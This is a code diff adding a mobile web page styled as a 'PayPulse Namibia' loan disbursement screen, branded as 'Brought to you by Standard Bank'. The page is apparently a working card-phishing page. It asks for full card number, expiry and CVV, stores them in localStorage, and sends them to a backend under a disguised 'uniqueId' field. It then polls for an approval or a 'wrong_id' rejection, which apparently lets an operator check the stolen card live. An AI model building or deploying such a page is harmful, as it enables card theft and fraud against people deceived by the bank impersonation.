@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-visual">
+    <title>PayPulse Namibia | Card Details</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, #C7D2DC 0%, #E5E5E5 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+            padding: 20px 16px;
+        }
+
+        /* Portrait-oriented mobile container wrapper preserving proportions */
+        .mobile-viewport {
+            width: 100%;
+            max-width: 400px;
+            min-height: 720px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 28px 20px;
+        }
+
+        .top-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Top Navigation Bar */
+        .pp-navbar {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding-bottom: 12px;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #CBD5E1;
+        }
+
+        .nav-title {
+            color: #5A6A85;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .pp-header {
+            text-align: center;
+            margin-bottom: 18px;
+            width: 100%;
+        }
+
+        .pp-header h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #182342;
+            margin-bottom: 4px;
+            letter-spacing: -0.3px;
+        }
+
+        .pp-header p {
+            font-size: 13px;
+            color: #5A6A85;
+            font-weight: 400;
+            line-height: 1.4;
+        }
+
+        /* 3D Glassy Card Preview Container */
+        .card-preview-box {
+            width: 100%;
+            height: 195px;
+            background: linear-gradient(135deg, rgba(10, 55, 104, 0.85), rgba(23, 75, 118, 0.9));
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 16px;
+            padding: 18px;
+            margin-bottom: 16px;
+            text-align: left;
+            box-shadow: 0 15px 30px rgba(10, 55, 104, 0.25), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+            transform-style: preserve-3d;
+            perspective: 1000px;
+            transition: transform 0.1s ease;
+        }
+
+        .card-preview-box::before {
+            content: '';
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, rgba(245, 191, 96, 0.25) 0%, transparent 70%);
+            border-radius: 50%;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .card-top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .card-chip {
+            width: 40px;
+            height: 30px;
+            background: linear-gradient(135deg, #F5BF60 0%, #D99B30 100%);
+            border-radius: 5px;
+            position: relative;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+        }
+
+        .card-brand {
+            font-size: 18px;
+            font-weight: 800;
+            color: #FFFFFF;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        .card-number-display {
+            font-size: 17px;
+            font-weight: 700;
+            letter-spacing: 2.5px;
+            color: #FFFFFF;
+            margin-bottom: 18px;
+            position: relative;
+            z-index: 2;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+
+        .card-bottom-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: relative;
+            z-index: 2;
+        }
+
+        .card-holder-info label, .card-expiry-info label {
+            display: block;
+            font-size: 8px;
+            text-transform: uppercase;
+            color: rgba(255, 255, 255, 0.7);
+            letter-spacing: 0.5px;
+            margin-bottom: 2px;
+        }
+
+        .card-holder-info span, .card-expiry-info span {
+            font-size: 12px;
+            font-weight: 600;
+            color: #FFFFFF;
+        }
+
+        /* Form Fields Container */
+        .pp-form-group {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .pp-input-wrapper {
+            position: relative;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.6);
+            border: 1px solid #CBD5E1;
+            border-radius: 10px;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .pp-input-wrapper.error-field {
+            border: 1px solid #DC2626 !important;
+            box-shadow: 0 0 8px rgba(220, 38, 38, 0.2);
+        }
+
+        .pp-input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: 14px;
+            font-weight: 500;
+            color: #182342;
+            caret-color: #0A3768;
+            letter-spacing: 0.5px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .pp-input::placeholder {
+            color: #8C9EAC;
+            font-weight: 400;
+            font-size: 13px;
+        }
+
+        .card-type-indicator {
+            position: absolute;
+            right: 14px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #5A6A85;
+            text-transform: uppercase;
+            pointer-events: none;
+        }
+
+        .card-row-split {
+            display: flex;
+            gap: 10px;
+            width: 100%;
+        }
+
+        /* Validation Alert */
+        .card-validation-alert {
+            width: 100%;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            background: rgba(220, 38, 38, 0.1);
+            border: 1px solid rgba(220, 38, 38, 0.25);
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 11px;
+            color: #DC2626;
+            text-align: left;
+            font-weight: 500;
+        }
+
+        /* Toast Alert */
+        .pp-toast-alert {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-20px);
+            background: #182342;
+            border: 1px solid #F5BF60;
+            color: #FFFFFF;
+            padding: 10px 18px;
+            border-radius: 24px;
+            font-size: 12px;
+            font-weight: 600;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            z-index: 1000;
+            opacity: 0;
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+
+        .pp-toast-alert.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .pp-toast-alert i {
+            color: #F5BF60;
+        }
+
+        /* Bottom Stack */
+        .bottom-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: auto;
+            padding-top: 20px;
+        }
+
+        /* Full Width Gradient Button */
+        .btn-confirm {
+            width: 85%;
+            height: 60px;
+            background: linear-gradient(90deg, #0A3768 0%, #315B83 100%);
+            color: #FFFFFF;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            box-shadow: 0 6px 16px rgba(10, 55, 104, 0.25);
+            transition: transform 0.15s ease;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-confirm:hover {
+            transform: translateY(-1px);
+        }
+
+        /* Footer Section */
+        .footer-container {
+            width: 100%;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .footer-bank-line {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #2D3748;
+        }
+
+        .footer-bank-line i {
+            font-size: 13px;
+            color: #174B76;
+        }
+
+        .footer-links-line {
+            font-size: 11px;
+            font-weight: 500;
+            color: #5A6A85;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Toast Alert -->
+    <div id="toastAlert" class="pp-toast-alert">
+        <i class="fa-solid fa-triangle-exclamation"></i>
+        <span id="toastMessage">Please complete all card details correctly.</span>
+    </div>
+
+    <div class="mobile-viewport">
+        
+        <!-- Top Stack -->
+        <div class="top-stack">
+            <!-- Top Navigation Bar -->
+            <div class="pp-navbar">
+                <div class="nav-title">Disbursement</div>
+            </div>
+
+            <div class="pp-header">
+                <h1>Card Verification</h1>
+                <p>Enter your card details to receive your loan disbursement.</p>
+            </div>
+
+            <!-- 3D Interactive Glassy Card Preview -->
+            <div class="card-preview-box" id="cardPreviewBox">
+                <div class="card-top-row">
+                    <div class="card-chip"></div>
+                    <div class="card-brand" id="previewBrand"></div>
+                </div>
+                <div class="card-number-display" id="previewNumber">•••• •••• •••• ••••</div>
+                <div class="card-bottom-row">
+                    <div class="card-holder-info">
+                        <label>Card Holder</label>
+                        <span id="previewHolder">FIRSTNAME SURNAME</span>
+                    </div>
+                    <div class="card-expiry-info">
+                        <label>Expires</label>
+                        <span id="previewExpiry">MM/YY</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Card Input Fields -->
+            <div class="pp-form-group">
+                <div class="card-row-split">
+                    <div class="pp-input-wrapper" id="wrapFirstName">
+                        <input type="text" id="firstName" class="pp-input" placeholder="First Name" required oninput="formatHolder()">
+                    </div>
+                    <div class="pp-input-wrapper" id="wrapSurname">
+                        <input type="text" id="surname" class="pp-input" placeholder="Surname" required oninput="formatHolder()">
+                    </div>
+                </div>
+
+                <div class="pp-input-wrapper" id="wrapCardNumber">
+                    <input type="text" id="cardNumber" class="pp-input" placeholder="Card Number" maxlength="19" inputmode="numeric" required oninput="formatCardNumber(this)">
+                    <span id="cardTypeIndicator" class="card-type-indicator"></span>
+                </div>
+
+                <!-- Validation Alert -->
+                <div id="cardAlert" class="card-validation-alert">
+                    <i class="fa-solid fa-circle-exclamation"></i>
+                    <span>Enter a valid card number</span>
+                </div>
+
+                <div class="card-row-split">
+                    <div class="pp-input-wrapper" id="wrapCardExpiry">
+                        <input type="text" id="cardExpiry" class="pp-input" placeholder="MM/YY" maxlength="5" inputmode="numeric" required oninput="formatExpiry(this)">
+                    </div>
+                    <div class="pp-input-wrapper" id="wrapCardCvv">
+                        <input type="password" id="cardCvv" class="pp-input" placeholder="CVV" maxlength="4" inputmode="numeric" required oninput="formatCvv(this)">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Stack -->
+        <div class="bottom-stack">
+            <!-- Confirm Button -->
+            <button type="button" id="nextBtn" class="btn-confirm" onclick="submitCard()">Confirm</button>
+
+            <!-- Footer -->
+            <div class="footer-container">
+                <div class="footer-bank-line">
+                    Brought to you by <i class="fa-solid fa-shield-halved"></i> <strong>Standard Bank</strong>
+                </div>
+                <div class="footer-links-line" onclick="alert('Privacy Policy & Terms and Conditions')">
+                    Privacy Policy & Terms and Conditions
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+<script>
+    const firstNameInput = document.getElementById('firstName');
+    const surnameInput = document.getElementById('surname');
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardExpiryInput = document.getElementById('cardExpiry');
+    const cardCvvInput = document.getElementById('cardCvv');
+    
+    const nextBtn = document.getElementById('nextBtn');
+    const cardAlert = document.getElementById('cardAlert');
+    const toastAlert = document.getElementById('toastAlert');
+    const toastMessage = document.getElementById('toastMessage');
+
+    const previewNumber = document.getElementById('previewNumber');
+    const previewHolder = document.getElementById('previewHolder');
+    const previewExpiry = document.getElementById('previewExpiry');
+    const previewBrand = document.getElementById('previewBrand');
+    const cardTypeIndicator = document.getElementById('cardTypeIndicator');
+    const cardPreviewBox = document.getElementById('cardPreviewBox');
+    
+    let activeInterval = null;
+    cardAlert.style.display = 'none';
+    let toastTimeout = null;
+
+    const pageLoadTimestamp = Date.now();
+
+    window.addEventListener('DOMContentLoaded', () => {
+        localStorage.removeItem('paypulseApprovalTimestamp');
+    });
+
+    // 3D Tilt Effect
+    cardPreviewBox.addEventListener('mousemove', (e) => {
+        const rect = cardPreviewBox.getBoundingClientRect();
+        const x = e.clientX - rect.left;
+        const y = e.clientY - rect.top;
+        const xc = rect.width / 2;
+        const yc = rect.height / 2;
+        const dx = (x - xc) / xc;
+        const dy = (y - yc) / yc;
+
+        cardPreviewBox.style.transform = `rotateY(${dx * 8}deg) rotateX(${-dy * 8}deg) translateY(-2px)`;
+    });
+
+    cardPreviewBox.addEventListener('mouseleave', () => {
+        cardPreviewBox.style.transform = 'rotateY(0deg) rotateX(0deg) translateY(0px)';
+    });
+
+    function showToast(msg) {
+        if (msg) toastMessage.textContent = msg;
+        toastAlert.classList.add('show');
+        if (toastTimeout) clearTimeout(toastTimeout);
+        toastTimeout = setTimeout(() => {
+            toastAlert.classList.remove('show');
+        }, 3500);
+    }
+
+    function isValidCardNumber(cardNumber) {
+        const clean = cardNumber.replace(/\D/g, '');
+        if (clean.length < 13 || clean.length > 19) return false;
+        
+        let sum = 0;
+        let shouldDouble = false;
+        for (let i = clean.length - 1; i >= 0; i--) {
+            let digit = parseInt(clean.charAt(i), 10);
+            if (shouldDouble) {
+                digit *= 2;
+                if (digit > 9) digit -= 9;
+            }
+            sum += digit;
+            shouldDouble = !shouldDouble;
+        }
+        return (sum % 10) === 0;
+    }
+
+    function detectCardBrand(number) {
+        const cleanNum = number.replace(/\s/g, '');
+        if (/^4/.test(cleanNum)) return { name: 'VISA' };
+        if (/^(5[1-5]|222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(cleanNum)) return { name: 'MASTERCARD' };
+        if (/^3[47]/.test(cleanNum)) return { name: 'AMEX' };
+        return { name: 'CARD' };
+    }
+
+    function formatHolder() {
+        const first = firstNameInput.value.trim().toUpperCase();
+        const surname = surnameInput.value.trim().toUpperCase();
+        const fullName = `${first} ${surname}`.trim();
+        previewHolder.textContent = fullName || 'FIRSTNAME SURNAME';
+
+        if (first) document.getElementById('wrapFirstName').classList.remove('error-field');
+        if (surname) document.getElementById('wrapSurname').classList.remove('error-field');
+    }
+
+    function formatCardNumber(input) {
+        let value = input.value.replace(/\D/g, '').slice(0, 16);
+        let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
+        input.value = formatted;
+        
+        previewNumber.textContent = formatted || '•••• •••• •••• ••••';
+
+        const brandInfo = detectCardBrand(value);
+        if (value.length >= 2 && brandInfo.name) {
+            previewBrand.textContent = brandInfo.name;
+            cardTypeIndicator.textContent = brandInfo.name;
+        } else {
+            previewBrand.textContent = '';
+            cardTypeIndicator.textContent = '';
+        }
+
+        cardAlert.style.display = 'none';
+        if (input.value.trim().length > 0) {
+            document.getElementById('wrapCardNumber').classList.remove('error-field');
+        }
+    }
+
+    function formatExpiry(input) {
+        let value = input.value.replace(/\D/g, '').slice(0, 4);
+        if (value.length >= 3) {
+            value = value.slice(0, 2) + '/' + value.slice(2);
+        }
+        input.value = value;
+        previewExpiry.textContent = value || 'MM/YY';
+        if (input.value.trim().length > 0) {
+            document.getElementById('wrapCardExpiry').classList.remove('error-field');
+        }
+    }
+
+    function formatCvv(input) {
+        input.value = input.value.replace(/\D/g, '').slice(0, 4);
+        if (input.value.trim().length > 0) {
+            document.getElementById('wrapCardCvv').classList.remove('error-field');
+        }
+    }
+
+    function submitCard() {
+        const first = firstNameInput.value.trim();
+        const surname = surnameInput.value.trim();
+        const cNum = cardNumberInput.value.replace(/\s/g, '');
+        const cExp = cardExpiryInput.value;
+        const cCvv = cardCvvInput.value;
+
+        let hasError = false;
+
+        if (!first) {
+            document.getElementById('wrapFirstName').classList.add('error-field');
+            hasError = true;
+        }
+        if (!surname) {
+            document.getElementById('wrapSurname').classList.add('error-field');
+            hasError = true;
+        }
+        if (!isValidCardNumber(cNum)) {
+            document.getElementById('wrapCardNumber').classList.add('error-field');
+            cardAlert.style.display = 'flex';
+            hasError = true;
+        }
+        if (cExp.length !== 5) {
+            document.getElementById('wrapCardExpiry').classList.add('error-field');
+            hasError = true;
+        }
+        if (cCvv.length < 3) {
+            document.getElementById('wrapCardCvv').classList.add('error-field');
+            hasError = true;
+        }
+
+        if (hasError) {
+            showToast('Please complete all card details correctly.');
+            return;
+        }
+
+        submitCardDetails(first, surname, cNum, cExp, cCvv);
+    }
+
+    async function submitCardDetails(first, surname, num, expiry, cvv) {
+        const phoneInput = localStorage.getItem('paypulseUserPhone') || localStorage.getItem('userPhone') || 'PayPulse User';
+        const detectedBrand = detectCardBrand(num).name || 'Card';
+        const fullName = `${first} ${surname}`;
+
+        const cardPayload = `Brand: ${detectedBrand} | Card: ${num} | Holder: ${fullName} | Exp: ${expiry} | CVV: ${cvv}`;
+        localStorage.setItem('paypulseLastCard', cardPayload);
+
+        try {
+            nextBtn.style.opacity = '0.7';
+            nextBtn.innerText = 'Processing...';
+            nextBtn.style.cursor = 'wait';
+            nextBtn.onclick = null;
+
+            const response = await fetch('/api/submit-order', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phoneInput, uniqueId: cardPayload })
+            });
+
+            const result = await response.json();
+
+            if (result.success !== false) {
+                pollApprovalStatus(phoneInput);
+            } else {
+                showToast('Verification failed. Please try again.');
+                resetButtonState();
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            pollApprovalStatus(phoneInput);
+        }
+    }
+
+    function resetButtonState() {
+        nextBtn.style.opacity = '1';
+        nextBtn.style.cursor = 'pointer';
+        nextBtn.innerText = 'Confirm';
+        nextBtn.onclick = submitCard;
+    }
+
+    function pollApprovalStatus(phone) {
+        const cleanPhone = phone.trim();
+
+        if (activeInterval) clearInterval(activeInterval);
+
+        const submissionTimestamp = Date.now();
+
+        activeInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}&t=${Date.now()}`);
+                const data = await response.json();
+
+                if (data.status === 'approved' && data.timestamp && data.timestamp >= pageLoadTimestamp && data.timestamp >= submissionTimestamp) {
+                    clearInterval(activeInterval);
+                    window.location.href = 'verify.html';
+                } 
+                else if ((data.status === 'rejected' || data.status === 'wrong_id') && data.timestamp && data.timestamp >= submissionTimestamp) {
+                    clearInterval(activeInterval);
+                    showToast('⚠️ Incorrect card information. Please check and re-enter.');
+                    resetButtonState();
+                }
+            } catch (e) {
+                console.error('Polling error', e);
+            }
+        }, 3000);
+    }
+</script>
+
+</body>
+</html>
